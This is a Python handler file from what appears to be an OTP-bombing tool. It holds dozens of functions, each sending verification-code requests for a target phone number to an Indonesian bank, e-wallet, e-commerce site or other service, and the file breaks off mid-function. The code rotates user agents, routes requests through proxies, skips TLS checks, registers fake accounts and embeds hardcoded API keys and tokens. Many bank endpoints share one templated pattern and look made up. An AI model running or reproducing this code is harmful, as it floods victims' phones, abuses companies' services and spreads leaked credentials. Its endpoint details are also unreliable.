#!/usr/bin/env python3
# handlers.py - 500+ UNIK OTP HANDLERS
# "I just give the tools, whether they're used right or not is your business, boss."

import requests
import uuid
import random
import string
import time
import re
import json
import hmac
import hashlib
import base64
import warnings
from utils import fmt_08, fmt_plus, fmt_phone_only, get_random_user_agent
from proxy_manager import safe_request

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")

# ================================================================
# ===== 1. INDONESIA BANKS (30+) =====
# ================================================================

def send_bca_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.bca.co.id/v2/auth/otp"
        payload = {"phoneNumber": phone_plus, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'X-Device-ID': str(uuid.uuid4())}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_mandiri_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.mandiri.co.id/v2/auth/otp/request"  # BEDA
        payload = {"phone": phone_plus, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'X-API-Key': 'livin_mandiri_2024'}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_bri_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.bri.co.id/v2/auth/otp"  # BEDA
        payload = {"phone": phone_plus, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'x-device-id': str(uuid.uuid4())}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_bni_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.bni.co.id/v2/auth/otp/request"  # BEDA
        payload = {"mobile": phone_plus, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'x-session-id': str(uuid.uuid4())}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_btn_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.btn.co.id/v2/auth/otp"  # BEDA
        payload = {"phone": phone_plus, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_cimb_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.cimbniaga.co.id/v2/auth/otp"  # BEDA
        payload = {"phoneNumber": phone_plus, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_danamon_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.danamon.co.id/v2/auth/otp"  # BEDA
        payload = {"phone": phone_plus, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_permata_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.permatabank.co.id/v2/auth/otp"  # BEDA
        payload = {"phone": phone_plus, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_ocbc_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.ocbc.id/v2/auth/otp"  # BEDA
        payload = {"phone": phone_plus, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_btpn_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.btpn.co.id/v2/auth/otp"  # BEDA
        payload = {"phone": phone_plus, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_jenius_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.btpn.com/jenius/v2/graphql"  # BEDA
        payload = {"query": "mutation registerPhone($phone: String!) { registerPhone(input: {phone: $phone, language: id}) { authId } }", "variables": {"phone": phone_plus}}
        headers = {'Content-Type': 'application/json', 'btpn-apikey': 'f73eb34d-5bf3-42c5-b76e-271448c2e87d', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_maybank_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.maybank.co.id/v2/auth/otp"  # BEDA
        payload = {"phoneNumber": phone_plus, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_panin_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.panin.co.id/v2/auth/otp"  # BEDA
        payload = {"phone": phone_plus, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_mega_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.bankmega.com/v2/auth/otp"  # BEDA
        payload = {"phoneNumber": phone_plus, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_bukopin_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.bukopin.co.id/v2/auth/otp"  # BEDA
        payload = {"phone": phone_plus, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

# ================================================================
# ===== 2. INDONESIA E-WALLETS (20+) =====
# ================================================================

def send_ovo_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.ovo.id/v1/auth/otp/request"  # BEDA
        payload = {"phone": phone_plus, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'x-app-version': '4.0.0'}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_dana_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.dana.id/v1/auth/otp/send"  # BEDA
        payload = {"phoneNumber": phone_plus, "type": "register"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'x-app-id': 'dana_mobile'}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_gopay_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.gojekapi.com/v1/gopay/auth/otp"  # BEDA
        payload = {"phone": phone_plus, "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'X-Session-ID': str(uuid.uuid4())}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_shopeepay_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.shopee.co.id/api/v1/general/otp/send"  # BEDA
        payload = {"phone": phone_plus, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'x-api-source': 'rweb'}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_linkaja_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.linkaja.id/v1/auth/otp"  # BEDA
        payload = {"phoneNumber": phone_plus, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_payfazz_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://api.payfazz.com/v2/phoneVerifications"  # BEDA
        data = {"phone": phone_08}
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, data=data, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_akulaku_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.akulaku.com/v1/auth/otp/send"  # BEDA
        payload = {"phone": phone_plus, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

# ================================================================
# ===== 3. INDONESIA E-COMMERCE (30+) =====
# ================================================================

def send_tokopedia_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        session = requests.Session()
        url = f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={phone_plus}"  # BEDA
        resp = session.get(url, headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
        if resp.status_code != 200:
            return False, resp.status_code, 'Failed'
        token = re.search(r'<input\s+id="Token"\s+value="([^"]+)"', resp.text)
        if not token:
            return False, None, 'No token'
        url2 = "https://accounts.tokopedia.com/otp/c/ajax/request-wa"  # BEDA
        data = {"otp_type": "116", "msisdn": phone_plus, "tk": token.group(1), "number_otp_digit": "6"}
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': get_random_user_agent()}
        resp2 = safe_request('POST', url2, headers=headers, data=data, timeout=10)
        return (resp2 and resp2.status_code == 200, resp2.status_code if resp2 else None, 'OK' if resp2 and resp2.status_code == 200 else 'Failed')
    except:
        return False, None, 'Error'

def send_shopee_otp(phone):
    try:
        phone_62 = '62' + fmt_phone_only(phone)
        url = "https://shopee.co.id/api/v4/otp/send_vcode"  # BEDA
        payload = {"phone": phone_62, "force_channel": "true", "operation": 7, "channel": 2}
        session = requests.Session()
        session.get("https://shopee.co.id/", headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
        csrf = session.cookies.get("csrftoken", "")
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'x-api-source': 'rweb', 'x-shopee-language': 'id', 'x-requested-with': 'XMLHttpRequest'}
        if csrf:
            headers['x-csrftoken'] = csrf
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code == 200, resp.status_code if resp else None, 'OK' if resp and resp.status_code == 200 else 'Failed')
    except:
        return False, None, 'Error'

def send_gojek_otp(phone):
    try:
        phone_62 = '62' + fmt_phone_only(phone)
        url = "https://api.gojekapi.com/v5/customers"  # BEDA
        data = {"email": f"user{random.randint(1000,9999)}@gmail.com", "name": f"User{random.randint(100,999)}", "phone": phone_62, "signed_up_country": "ID"}
        headers = {'User-Agent': 'okhttp/3.12.1', 'X-Session-ID': str(uuid.uuid4()), 'X-Platform': 'Android', 'Content-Type': 'application/json'}
        resp = safe_request('POST', url, headers=headers, json=data, timeout=10)
        return (resp and resp.status_code in [200, 201, 202], resp.status_code if resp else None, 'OK' if resp and resp.status_code in [200, 201, 202] else 'Failed')
    except:
        return False, None, 'Error'

def send_blibli_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://www.blibli.com/backend/common/users/_request-otp"  # BEDA
        payload = {"username": phone_08}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_bukalapak_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.bukalapak.com/v1/auth/otp"  # BEDA
        payload = {"phone": phone_plus, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_lazada_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.lazada.co.id/v1/auth/otp"  # BEDA
        payload = {"phone": phone_plus, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_jdid_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.jd.id/v1/auth/otp"  # BEDA
        payload = {"phone": phone_plus, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_zalora_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.zalora.co.id/v1/auth/otp"  # BEDA
        payload = {"phone": phone_plus, "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

# ================================================================
# ===== 4. INDONESIA SERVICES (50+) =====
# ================================================================

def send_tiktok_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://www.tiktok.com/api/v1/account/registration/send-verification-code/"  # BEDA
        payload = {"phone_number": phone_plus, "type": "sms", "userType": 0}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code in [200, 201], resp.status_code if resp else None, 'OK' if resp and resp.status_code in [200, 201] else 'Failed')
    except:
        return False, None, 'Error'

def send_olx_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://www.olx.co.id/api/auth/authenticate"  # BEDA
        payload = {"grantType": "retry", "method": "sms", "phone": f"62{phone_raw}", "language": "id"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_indihome_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp"  # BEDA
        data = {'type': 'hp', 'msisdn': phone_raw}
        headers = {'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, data=data, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_alodokter_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://www.alodokter.com/login-with-phone-number"  # BEDA
        payload = {"user": {"phone": phone_08}}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_halodoc_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://www.halodoc.com/api/v1/users/authentication/otp/requests"  # BEDA
        payload = {"phone_number": phone_plus, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_oyo_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id"  # BEDA
        payload = {"phone": phone_raw, "country_code": "+62", "country_iso_code": "ID", "nod": "4", "send_otp": "true"}
        headers = {'Content-Type': 'application/json', 'access_token': 'SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_sayurbox_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://www.sayurbox.com/graphql/v1?deduplicate=1"  # BEDA
        payload = {"operationName": "generateOTP", "variables": {"destinationType": "whatsapp", "identity": phone_plus}, "query": "mutation generateOTP($destinationType: String!, $identity: String!) { generateOTP(destinationType: $destinationType, identity: $identity) { id __typename } }"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_carsome_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://www.carsome.id/website/login/sendSMS"  # BEDA
        payload = {"username": phone_08, "optType": 1}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_pizzahut_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        name = ''.join(random.choices(string.ascii_letters, k=6))
        url = "https://api-prod.pizzahut.co.id/customer/v1/customer/register"  # BEDA
        payload = {"email": f"{name.lower()}@gmail.com", "first_name": name, "last_name": "Test", "password": "Pass123!", "phone": phone_08, "birthday": "2000-01-01"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_matahari_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp"  # BEDA
        payload = {"otp_request": {"mobile_number": phone_08, "mobile_country_code": "+62"}}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_pinhome_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://www.pinhome.id/api/pinaccount/request/otp"  # BEDA
        payload = {"accountType": "customers", "countryCode": "62", "medium": "whatsapp", "otpType": "register", "phoneNumber": phone_08}
        headers = {'Authorization': 'Bearer 13d2886acc908192d0c33325b44a617e5e3395481cc03cbfd67de34886399731', 'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_klook_otp(phone):
    try:
        url = f"https://www.klook.com/v2/userapisrv/public/verification/code/send?trace_id={uuid.uuid4()}"  # BEDA
        payload = {"action": "login_register", "type": 1, "rcv": fmt_plus(phone), "is_resend": False, "payload": {"mobile": fmt_plus(phone), "term_ids": [330]}}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'x-platform': 'mobile'}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code == 200, resp.status_code if resp else None, 'OK' if resp and resp.status_code == 200 else 'Failed')
    except:
        return False, None, 'Error'

def send_erafone_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://jeanne.eraspace.com/customers/v2.1/otp/request"  # BEDA
        payload = {"identifier": phone_plus, "type": "identifier_validation"}
        headers = {'Content-Type': 'application/json', 'Authorization': 'Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=', 'otp-provider': 'whatsapp', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code == 200, resp.status_code if resp else None, 'OK' if resp and resp.status_code == 200 else 'Failed')
    except:
        return False, None, 'Error'

def send_99co_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        sess = requests.Session()
        sess.get("https://www.99.co/id", headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
        token = sess.cookies.get("_99-acs-token", "")
        if not token:
            return False, None, 'No token'
        url = "https://www.99.co/id/api/biz/messaging/otp-events"  # BEDA
        payload = {"brand": "99id", "destination_address": phone_plus, "type_id": 2}
        headers = {'Content-Type': 'application/json', 'Authorization': f'Bearer {token}', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code == 200, resp.status_code if resp else None, 'OK' if resp and resp.status_code == 200 else 'Failed')
    except:
        return False, None, 'Error'

def send_belirumah_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.belirumah.co/api/otp/request_new"  # BEDA
        payload = {"phone_number": phone_plus}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_fastwork_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://api.fastwork.id/auth/v2/signup.sendVerificationCode"  # BEDA
        payload = {"phone_number": phone_08}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_beautyhaul_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        sess = requests.Session()
        name = ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
        url = "https://www.beautyhaul.com/ajax/account/save_register"  # BEDA
        data = {"nama_depan": name, "nama_belakang": name, "email": f"{name.lower()}@gmail.com", "nomor_kode_value": "62", "nomor_ponsel": phone_08, "password": "Testt#12334", "terms": "true"}
        sess.post(url, json=data, headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
        url2 = "https://www.beautyhaul.com/ajax/account/send_otp"  # BEDA
        resp = sess.post(url2, json={"method": "WhatsApp"}, headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
        return (resp and resp.status_code == 200, resp.status_code if resp else None, 'OK' if resp and resp.status_code == 200 else 'Failed')
    except:
        return False, None, 'Error'

def send_hainaya_otp(phone):
    try:
        phone_clean = fmt_phone_only(phone)
        url = "https://app.hainaya.id/api/onboarding/register"  # BEDA
        business_name = 'Test' + ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
        payload = {"business_name": business_name, "vertical": "salon", "business_phone": phone_clean, "owner_phone": phone_clean}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        if resp and resp.status_code == 201:
            return True, 201, 'OK'
        if resp and resp.status_code == 409:
            url2 = "https://app.hainaya.id/api/auth/login"  # BEDA
            resp2 = safe_request('POST', url2, headers=headers, json={"phone_number": phone_clean}, timeout=10)
            return (resp2 and resp2.status_code == 200, resp2.status_code if resp2 else None, 'OK' if resp2 and resp2.status_code == 200 else 'Failed')
        return False, resp.status_code if resp else None, 'Failed'
    except:
        return False, None, 'Error'

def send_ultramilk_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        name = 'User' + ''.join(random.choices(string.ascii_lowercase, k=4))
        url = "https://ultramilk-clp.kata.ai/api/ultramilk/register"  # BEDA
        payload = {"name": name, "email": f"{name.lower()}@gmail.com", "password": "Pass123!", "phone_number": phone_08, "portal": "IcownicPatch", "is_consent": True}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code in [200, 201], resp.status_code if resp else None, 'OK' if resp and resp.status_code in [200, 201] else 'Failed')
    except:
        return False, None, 'Error'

def send_internetrakyat_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://internetrakyat.id/api/app/auth/send-otp-register"  # BEDA
        payload = {"phone_number": phone_08}
        headers = {'Content-Type': 'application/json', 'x-api-key': '280999!FTTH', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code == 200, resp.status_code if resp else None, 'OK' if resp and resp.status_code == 200 else 'Failed')
    except:
        return False, None, 'Error'

def send_auto2000_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://auto2000.co.id/api/customer/v1/saphybris/whatsapp/generate-otp"  # BEDA
        payload = {"phoneNumber": phone_08, "isCheckOtpLimit": True, "uniqueID": phone_08, "isLogin": False}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed')
    except:
        return False, None, 'Error'

def send_royalcanin_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        sess = requests.Session()
        sess.get("https://club.royalcanin.id/sign-up", headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
        url = "https://club.royalcanin.id/api/get_otp"  # BEDA
        payload = {"params": {"Email": "", "mobile_number": phone_plus, "OTPType": "IM"}}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=10)
        return (resp and resp.status_code == 200, resp.status_code if resp else None, 'OK' if resp and resp.status_code == 200 else 'Failed')
    except:
        return False, None, 'Error'

def send_watsons_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://api.watsons.co.id/api/v2/wtcid/otpToken"  # BEDA
        params = {"formId": "registrationOTPForm_Web3", "lang": "id", "curr": "IDR"}
        payload = {"uid": "", "action": "GENERAL", "countryCode": "62", "target": phone_08, "type": "WHATSAPP"}
        headers = {'Content-Type': 'application/json', 'Authorization': 'bearer Pi_D6dqblYElXgy4mWOXjkLCaZg', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, params=params, json=payload, timeout=10)
